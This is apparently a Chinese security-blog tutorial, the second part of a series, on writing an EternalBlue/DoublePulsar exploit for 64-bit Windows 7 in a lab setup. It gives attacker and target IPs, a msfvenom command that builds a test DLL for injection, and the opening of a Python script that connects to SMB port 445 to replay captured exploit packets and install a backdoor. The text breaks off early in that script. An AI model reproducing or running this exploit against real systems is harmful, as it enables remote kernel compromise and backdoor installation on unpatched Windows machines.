# 【技术分享】EternalBlue之win7 64位exploit编写(二)
|
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
****
作者：[东](http://bobao.360.cn/member/contribute?uid=2554610746)
预估稿费：400RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**前言**
****
在上一篇文章中,原文链接: 
我们构造了针对于Win 7三十二位操作系统攻击exploit,本节将完成一个win7 64位的exploit
**上节回顾**
****
win7 三十二位的exploit是由两部分功能代码组成的,一个是 **安装后门** ( **Eternalblue** ) ，另一个则是 **后门维持**
( **Doublepulsar** )
1.Win7三十二位与六十四位安装后门 实际就是hook了 **ntdll!kiFastCallEntry。**
所以内核层函数的hook(后门安装)也是受内核版本影响
2.注入部分。没什么解释的，通常情况32位dll只能注入32位进程， 64位dll只能注入64位进程
想多了解些的可以读下15pb 赵神这篇
([关于32位和64位进程互读互写](http://mp.weixin.qq.com/s?__biz=MzA3NjE4NDc4MQ==&mid=2649895734&idx=1&sn=845f4f3f0a14f1d05b4d2c6b3d3d6b9c&chksm=))
**实验环境**
****
网络环境: 局域网
攻击ip: 192.168.157.129(win7_x86)
靶机ip: 192.168.157.130(win7_x64)
工具: NSA的fb.py、wireshark、python、hex editor、
**实验步骤**
****
**0x1: 一样的套路 开wireshark监听port 445捕捉到Eternalblue的数据流**
**0x2: 捕捉Doubleplusar动作的数据流**
在六十四位下和三十二位包的数量都是一样的,可能不同就在某个字段上。
**0x3: 数据包处理**
接着就用上节的脚本来把Eternalblue攻击的数据包序列化供给我们的python调用
接着就是手动去分析Doubleplusar 在六十四位和三十二位的不同，参考文章:
发现是signature字段
三十二位: xxxxxxxxx0xxxxxx
六十四位: xxxxxxxxx1xxxxxx
其他没什么问题。
**0x4: exploit构造脚本**
关于测试dll的生成:
kali-> msfvenom -p windows/x64/exec CMD="calc.exe" -f dll > /x64.dll
这样生成就可以, 上面我用Doublepuls注入的dll是用msf生的。 注入哪个进程随你，脚本中默认是explorer。
测试dll要选择64位dll。否则可能出现蓝屏现象。
    #!/usr/bin/python
    # -*- coding: utf-8 -*-    
    import socket
    import time
    import ast
    import binascii
    import struct
    HOST ='192.168.157.130'
    PORT = 445
    dllfile = "x64_calc.dll"
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((HOST,PORT))
    def Install_Backdoor():
    	backlog = open("eternalblue.replay").read().split("nn")